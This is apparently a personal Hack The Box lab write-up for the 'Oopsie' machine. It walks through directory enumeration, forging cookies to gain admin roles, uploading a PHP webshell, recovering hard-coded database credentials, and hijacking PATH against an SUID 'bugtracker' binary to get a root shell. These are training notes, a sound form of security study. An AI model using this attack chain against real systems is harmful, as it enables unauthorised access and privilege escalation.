#hackthebox #lab #enumeration #privesc

We have a empty website, which we want to enumerate.
```shell
gobuster dir -u http://10.129.95.191 --wordlist ~/wordlists/seclists/Discovery/Web-Content/common.txt
```

```shell
ffuf -w ~/wordlists/seclists/Discovery/Web-Content/common.txt -u http://10.129.95.191/FUZZ -e .txt,.html,.bak,.php,.js -recursion
```

Also, sitemap in burp is also very handy, try looking at this after we have done some manual testing.

NOTE: Very important to consider depth when we are enumerating directories.

We can get cookie information via the id parameter, and get access to different accounts:
```
Cookie: user=86575; role=super admin
Cookie: user=34322; role=admin
```

Now we have access to uploading files, so we try uploading a php webshell. Now the next step is to find out where it gets uploaded.

From the enumeration we have seen a /uploads folder, but it returns 403 forbidden access - even with the super admin.

NOTE: Never assume just because the root directory is locked, we cannot access its child items!

So we try to access /uploads/{filename} -> and this we can access, and we have a webshell. 

mysqli_connect('localhost','robert','M3g4C0rpUs3r!','garage')

id:
```
robert@oopsie:~$ id
uid=1000(robert) gid=1000(robert) groups=1000(robert),1001(bugtracker)

```
- Observe we are added to a group bugtracker. 
- We should check out all files owned by them.

Tips: find all files owned by a group:
```
sudo find / -group group_name
```

Normal sbit checking:
```
find / -type f -perm -u=s 2>/dev/null
```
- Here we see that the sbit is set for /usr/bin/bugtracker, which means it gets run as root even if we call it from robert. 
- Running the program we can see that it calls "cat"
```
robert@oopsie:~$ bugtracker

------------------
: EV Bug Tracker :
------------------

Provide Bug ID: 123
---------------

cat: /root/reports/123: No such file or directory
```

IMPORTANT: It does not look like it call the full path of cat ie. /bin/cat. This means we might be able to trick bugtracker all another file named "cat".

1. Create the file /tmp/cat and make it call /bin/sh and make it executable.
2. Add /tmp to path: export PATH=/tmp:$PATH
3. Now bugtracker should end up calling /tmp/cat with root permissions, which ends up giving us a root shell.

NOTE: we could also just have made bugtracker cat the /root/root.txt file directly to get the root flag. But know how to privesc this into a shell is important. 